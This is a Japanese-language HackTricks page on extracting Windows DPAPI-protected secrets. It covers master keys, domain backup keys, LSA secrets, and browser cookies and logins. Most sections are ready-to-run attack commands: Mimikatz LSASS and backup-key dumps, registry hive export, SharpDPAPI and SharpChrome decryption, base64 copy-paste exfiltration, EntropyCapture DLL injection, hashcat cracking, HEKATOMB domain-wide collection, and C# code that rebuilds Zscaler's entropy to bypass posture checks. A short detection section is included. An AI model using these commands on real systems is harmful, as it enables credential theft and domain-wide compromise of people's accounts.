# DPAPI - Passwordの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

Data Protection API (DPAPI) は、主にWindowsオペレーティングシステムで**非対称秘密鍵を対称暗号化する**ために使用され、ユーザーまたはシステムのシークレットを主要なエントロピー源として利用します。この方法により、ユーザーのログオンシークレット、またはシステム暗号化の場合はシステムのドメイン認証シークレットから派生したキーを使ってデータを暗号化できるため、開発者が暗号化キーの保護を自ら管理する必要がなくなり、暗号化が簡単になります。

DPAPIを使用する最も一般的な方法は、**`CryptProtectData` と `CryptUnprotectData`** 関数です。これらを使うと、現在ログオンしているプロセスのセキュリティコンテキストでデータを暗号化および復号できます。デフォルトでは、暗号化したデータを復号できるのは、暗号化したときと同じユーザーまたはシステムのコンテキストのみです。<sup>[[2]](#references)[[3]](#references)</sup>

これらの関数は、暗号化と復号に使用するオプションの**エントロピーパラメーター**も受け取ります。オプションのエントロピーを使って保護したデータの復号には、同じエントロピー値が必要です。<sup>[[2]](#references)[[6]](#references)</sup>

### ユーザーキーの生成

DPAPIはユーザーの認証情報から、ユーザー固有の値（**pre-key**と呼ばれることが多い）を導出します。具体的な導出方法は、アカウントとオペレーティングシステムのバージョンによって異なります。たとえばImpacketは、UTF-16LEパスワードのSHA-1ダイジェストを使うHMAC-SHA1の方式、パスワードのMD4/NTハッシュを使う別の方式、Protected Users向けのPBKDF2-SHA256導出方式を試します。そのため、オフラインツールでは、平文パスワードまたは入手可能なNTハッシュから必要なマテリアルを導出できることがよくあります。<sup>[[2]](#references)[[10]](#references)</sup>

これは特に重要です。攻撃者がユーザーのパスワードハッシュを入手できれば、次のことが可能になるためです。

- APIに接続する必要なく、そのユーザーのキーで**DPAPIを使って暗号化されたあらゆるデータを復号する**
- 有効なDPAPIキーの生成を試みながら、オフラインで**パスワードをcrackする**

DPAPIは、保護されたblobごとに新しいmaster keyを作成するのではなく、ユーザーごとに1つ以上の**master key**を保持します。各master keyには**GUID**（Globally Unique Identifier）があり、暗号化されたblobには、それを保護するmaster keyが記録されています。<sup>[[2]](#references)</sup>

master keyは**`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**ディレクトリに保存されます。ここで`{SID}`はユーザーのSecurity Identifierです。master-keyファイルには、ユーザーの**pre-key**で保護されたマテリアルと、ドメインユーザーの場合は**domain backup key**で保護された復旧用マテリアルが含まれます。<sup>[[2]](#references)</sup>

master keyの暗号化に使われる**domain keyはドメインコントローラーにあり、変更されることはありません**。そのため、攻撃者がドメインコントローラーにアクセスできれば、domain backup keyを取得して、ドメイン内のすべてのユーザーのmaster keyを復号できます。<sup>[[2]](#references)</sup>

暗号化されたblobのヘッダーには、データの暗号化に使われた**master keyのGUID**が含まれています。

> [!TIP]
> DPAPIで暗号化されたblobは**`01 00 00 00`**で始まります

master keyを探すには:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

これは、ユーザーの複数の Master Keys がどのように見えるかを示しています。

![DPAPI とは - Users key generation: これは、ユーザーの複数の Master Keys がどのように見えるかを示しています](<../../images/image (1121).png>)

### Machine/System key generation

これは、マシンがデータを暗号化するために使用するキーです。**DPAPI_SYSTEM LSA secret** を基にしています。これは、SYSTEM ユーザーだけがアクセスできる特別なキーです。このキーは、マシンレベルの認証情報やシステム全体のシークレットなど、システム自体がアクセスする必要のあるデータの暗号化に使用されます。<sup>[[2]](#references)</sup>

これらのキーには**ドメインバックアップがない**ため、ローカルでのみアクセスできます。

- **Mimikatz** は、次のコマンドで LSA secrets をダンプしてアクセスできます: `mimikatz lsadump::secrets`
- このシークレットはレジストリ内に保存されているため、管理者は**DACL のアクセス許可を変更してアクセスできます**。レジストリのパスは次のとおりです: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- レジストリハイブからオフラインで抽出することもできます。たとえば、対象マシンの管理者としてハイブを保存し、外部に持ち出します:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

次に、解析用マシンでhiveからDPAPI_SYSTEM LSA secretを復元し、それを使ってmachine-scopeのDPAPI blobを復号します（例：マシン保護されたアプリケーションの認証情報やWi-Fiプロファイル）。

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam固有のDPAPIの例:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPIで保護されるデータ

DPAPIで保護される個人データには、次のものがあります。

- Windowsの認証情報
- Internet ExplorerとGoogle Chromeのパスワードおよび自動入力データ
- OutlookやWindows Mailなどのアプリケーションのメールアカウントおよび内部FTPアカウントのパスワード
- 共有フォルダー、リソース、ワイヤレスネットワーク、Windows Vaultのパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passport、各種暗号化や認証に使用する秘密鍵のパスワード
- Credential Managerで管理されるネットワークパスワード、およびSkypeやMSN messengerなど、CryptProtectDataを使用するアプリケーションの個人データ
- レジストリ内の暗号化されたblob
- ...

システムで保護されるデータには、次のものがあります。
- Wifiのパスワード
- ...

スケジュールされたタスクのパスワードは、LSA-secretに関する別の問題です。[Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type)で登録されたタスクは、ローカル管理者/SYSTEMの復旧用にパスワードを保存できます。S4Uまたは対話型トークンのタスクでは、パスワードが保存されたとは限りません。タスクの実行アカウント名だけよりも、プリンシパルとログオンタイプのほうが有力な判断材料です。

### マスターキーの抽出方法

- ユーザーにドメイン管理者権限がある場合、**ドメインバックアップキー**にアクセスして、ドメイン内のすべてのユーザーマスターキーを復号できます。

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- ローカル管理者権限があれば、**LSASS memoryにアクセス**して、接続中のすべてのユーザーのDPAPI master keysとSYSTEM keyを抽出できます。

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- ローカル管理者権限があれば、マシンのマスターキーを復号するために **DPAPI_SYSTEM LSA secret** にアクセスできます:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- ユーザーのパスワードまたはNTLM hashが分かっている場合、**ユーザーのmaster keysを直接復号できます**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- ユーザーとしてセッションに入っている場合、RPCを使ってDCにmaster keysを復号するための**backup keyを要求**できます。local adminで、ユーザーがログイン中なら、ユーザーの**session tokenを盗む**こともできます:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault の一覧表示

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPIで暗号化されたデータへのアクセス

### DPAPIで暗号化されたデータを探す

一般ユーザーの保護対象ファイルは、次の場所にあります。

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで `\Roaming\` を `\Local\` に置き換えた場所も確認してください。

列挙の例：

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、B64 blob 内の DPAPI 暗号化 blob を見つけられます:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

なお、[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（同じリポジトリにあります）を使うと、cookies などの機密データを DPAPI で復号できます。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron の簡易レシピ（SharpChrome）

- 現在のユーザーとして、保存されたログイン情報や cookies を対話的に復号する（ユーザーコンテキストで実行すると、ユーザーの Credential Manager から追加キーが解決されるため、Chrome 127 以降の app-bound cookies でも動作します）:

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- オフライン解析（ファイルしかない場合）。まずプロファイルの "Local State" から AES 状態キーを抽出し、それを使って cookie DB を復号します：

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI domain backup key (PVK)があり、対象ホストでadmin権限を持っている場合の、ドメイン全体/リモートのトリアージ:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- ユーザーの DPAPI prekey/credkey（LSASS から取得）を持っている場合、password cracking を省略して、プロファイルデータを直接復号できます。

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

メモ
- 新しい Chrome/Edge のビルドでは、特定の Cookie が「App-Bound」暗号化を使用して保存される場合があります。追加の app-bound key がないと、これらの Cookie をオフラインで復号することはできません。対象ユーザーのコンテキストで SharpChrome を実行すると、自動的に取得できます。以下で参照している Chrome のセキュリティブログ記事を参照してください。<sup>[[5]](#references)</sup>

### アクセスキーとデータ

- **SharpDPAPI を使用して**、現在のセッションから DPAPI で暗号化されたファイル内の認証情報を取得します。

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **認証情報を取得する**（暗号化データやguidMasterKeyなど）。<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Access masterkeys**:

RPC を使って、**domain backup key** を要求しているユーザーの masterkey を復号します。
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** ツールは、masterkey の復号にも次の引数を使用できます（`/rpc` でドメインのバックアップキーを取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメイン秘密鍵ファイルを指定したりできます...）：<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkeyを使用してデータを復号する**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号に次の引数もサポートしています（`/rpc` でドメインの backup key を取得したり、`/password` で平文パスワードを使用したり、`/pvk` で DPAPI ドメイン秘密鍵ファイルを指定したり、`/unprotect` で現在のユーザーのセッションを使用したりできます...）：<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey を直接使用する（パスワード不要）

LSASS を dump できる場合、Mimikatz から、平文のパスワードを知らなくてもユーザーの masterkeys を復号できる、ログオンごとの DPAPI key を取得できることがあります。この値をそのままツールに渡します。

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **現在のユーザーセッション**を使用して一部のデータを復号する:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py を使ったオフライン復号

被害者ユーザーの SID とパスワード（または NT hash）があれば、Impacket の dpapi.py を使って DPAPI masterkey と Credential Manager blob を完全にオフラインで復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上のアーティファクトを特定する:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - 対応する masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送ツールが不安定な場合は、ホスト上でファイルを base64 に変換し、出力をコピーする:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- ユーザーのSIDとパスワード/ハッシュを使ってmasterkeyを復号する：

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- 復号した masterkey を使用して credential blob を復号する:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

このワークフローでは、Windows Credential Managerを使うアプリに保存されたドメイン認証情報（管理者アカウント（例：`*_adm`）を含む）を取得できることがよくあります。

---

### Optional Entropy（「Third-party entropy」）の処理

アプリケーションによっては、`CryptProtectData` に追加の**entropy**値を渡すことがあります。この値がないと、正しいmasterkeyが分かっていてもblobを復号できません。そのため、この方法で保護された認証情報（Microsoft Outlookや一部のVPNクライアントなど）を標的とする場合、entropyの取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、対象プロセス内のDPAPI関数にhookを仕掛け、渡されたoptional entropyを透過的に記録するユーザーモードDLLです。`outlook.exe`や`vpnclient.exe`などのプロセスに対して**DLL-injection**モードでEntropyCaptureを実行すると、各entropyバッファを呼び出し元のプロセスおよびblobに対応付けたファイルが出力されます。取得したentropyは、後で**SharpDPAPI**（`/entropy:`）または**Mimikatz**（`/entropy:<file>`）に渡してデータを復号できます。<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### masterkeyのオフラインcracking（Hashcat & DPAPISnoop）

Microsoftは、Windows 10 v1607（2016）から**コンテキスト3**のmasterkey形式を導入しました。`hashcat` v6.2.6（2023年12月）では、masterkeyファイルからユーザーパスワードを直接GPUでcrackingできるhash-mode **22100**（DPAPI masterkey v1 コンテキスト）、**22101**（コンテキスト1）、**22102**（コンテキスト3）が追加されました。そのため攻撃者は、ターゲットシステムとやり取りせずに、word-list攻撃やbrute-force攻撃を実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）は、このプロセスを自動化します：

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

このツールは Credential と Vault の blob も解析し、crack 済みのキーで復号して、平文のパスワードをエクスポートできます。<sup>[[8]](#references)</sup>


### 他のマシンのデータへのアクセス

**SharpDPAPI と SharpChrome** では、**`/server:HOST`** オプションを指定してリモートマシンのデータにアクセスできます。もちろん、そのマシンにアクセスできる必要があります。以下の例では、**ドメインのバックアップ暗号化キーが既知である**ことを前提としています。

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを抽出し、RPC 経由で domain controller の backup key を取得する処理を自動化するツールです。スクリプトはその後、すべてのコンピューターの IP address を解決し、各コンピューターに対して smbclient を実行して、すべてのユーザーの DPAPI blob を取得し、domain backup key ですべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューター一覧を使えば、存在を知らなかった場合でも、すべてのサブネットを見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI で保護された secrets を自動的に dump できます。2.x リリースでは、次の機能が追加されました。<sup>[[9]](#references)</sup>

* 数百台のホストから blob を並列収集
* **context 3** masterkey の解析と Hashcat による crack の自動連携
* Chrome の「App-Bound」暗号化 cookie に対応（次のセクションを参照）
* 新しい **`--snapshot`** モードにより、endpoint を繰り返しポーリングして、新たに作成された blob を diff で検出

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault ファイルを解析する C# parser で、Hashcat/JtR 形式で出力でき、必要に応じて crack を自動実行できます。Windows 11 24H1 までの machine および user masterkey 形式を完全にサポートしています。<sup>[[8]](#references)</sup>


## 一般的な検出方法

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` など、DPAPI 関連ディレクトリ内のファイルへのアクセス。
    - 特に **C$** や **ADMIN$** などのネットワーク共有経由のアクセス。
- **Mimikatz**、**SharpDPAPI** などのツールを使った LSASS memory へのアクセスや masterkey の dump。
- Event **4662**: *オブジェクトに対して操作が実行されました* – **`BCKUPKEY`** object へのアクセスと関連付けて確認できます。
- プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求した場合の Event **4673/4674**。

---
### 2023-2025 年の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。ネットワークアクセスを持つ攻撃者は、domain member をだまして悪意のある DPAPI backup key を取得させ、ユーザーの masterkey を復号できる可能性があります。2023 年 11 月の累積更新プログラムで修正済みです。管理者は DC と workstation に最新の更新プログラムが適用されていることを確認してください。<sup>[[4]](#references)</sup>
* **Chrome 127「App-Bound」cookie encryption**（2024 年 7 月）では、従来の DPAPI のみの保護が、ユーザーの **Credential Manager** に保存される追加の key を使う方式に変更されました。cookie をオフラインで復号するには、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 と DonPAPI 2.x は、ユーザーコンテキストで実行すると追加の key を復元できます。<sup>[[5]](#references)</sup>


### ケーススタディ: Zscaler Client Connector – SID から導出されるカスタム Entropy

Zscaler Client Connector は、`C:\ProgramData\Zscaler` に複数の設定ファイル（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）を保存します。各ファイルは **DPAPI（Machine scope）** で暗号化されていますが、ベンダーはディスク上に保存するのではなく、*実行時に計算される* **custom entropy** を指定します。<sup>[[1]](#references)</sup>

Entropy は次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされた secret。
2. 設定の対象となる Windows account の **SID**。

DLL に実装されたアルゴリズムは、次のものと同等です。

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

秘密情報はディスクから読み取り可能な DLL に埋め込まれているため、**SYSTEM 権限を持つローカル攻撃者は、任意の SID の entropy を再生成し、blob をオフラインで復号できます**。

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

復号すると、すべての**device posture check**とその期待値を含む完全な JSON 設定が得られます。この情報は、クライアント側の bypass を試みる際に非常に役立ちます。

> ヒント: ほかの暗号化された artefact（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（ゼロバイト 16 個）で DPAPI により保護されています。そのため、SYSTEM 権限を取得すれば、`ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – ゼロトラストを信頼すべきか？Zscaler の posture check を bypass する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI におけるセキュリティ分析とデータ復元](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz と C++ を使って DPAPI で暗号化された secrets を読み取る](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）の spoofing 脆弱性](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows における Chrome cookies のセキュリティ強化](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI の optional entropy を簡単に抽出するツール](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 リリースノート](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub リポジトリ](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI プロジェクトページ](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、DPAPI decryption による DC admin 権限の取得](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 使用方法とオプション](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
